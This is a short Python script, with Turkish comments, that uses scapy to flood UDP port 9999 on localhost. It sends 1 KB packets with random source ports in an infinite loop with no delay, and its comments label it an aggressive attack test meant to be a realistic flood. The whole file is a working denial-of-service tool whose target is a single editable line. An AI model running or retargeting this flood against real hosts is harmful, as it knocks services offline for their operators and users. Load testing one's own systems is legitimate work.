from scapy.all import IP, UDP, Raw, send
import random

target = "127.0.0.1"
port = 9999
data = "X" * 1024 # Paket boyutunu büyüt (1 KB)

print("🔥 AGRESİF saldırı testi başlatıldı...")

# Hiç bekleme yapmadan sonsuz döngü
while True:
    # Rastgele kaynak portu kullanarak daha gerçekçi bir flood yapalım
    pkt = IP(dst=target)/UDP(sport=random.randint(1024, 65535), dport=port)/Raw(load=data)
    send(pkt, verbose=False)